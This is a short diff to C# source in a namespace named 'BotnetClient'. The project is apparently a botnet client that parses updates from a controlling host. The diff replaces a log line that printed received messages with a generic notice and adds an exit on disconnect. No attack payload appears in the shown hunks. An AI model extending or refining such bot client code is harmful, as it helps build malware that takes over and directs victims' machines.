@@ -144,7 +144,7 @@ namespace BotnetClient
                                         message = message.Replace("ping!", "");
                                     }
                                     // Print split updates into string array
-                                    log("Update: " + message);
+                                    log("Update recieved...");
                                     string[] updates = message.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                     foreach (string item in updates)
                                     {
@@ -235,6 +235,11 @@ namespace BotnetClient
                         catch (Exception e) { }
                         run = false;
                         log("Disconnected from host...");
+                        if (!restart)
+                        {
+                            log("Exiting...");
+                            Environment.Exit(0);
+                        }
                     }
                     // Manage of Socket's Exceptions 
                     catch (ArgumentNullException ane)
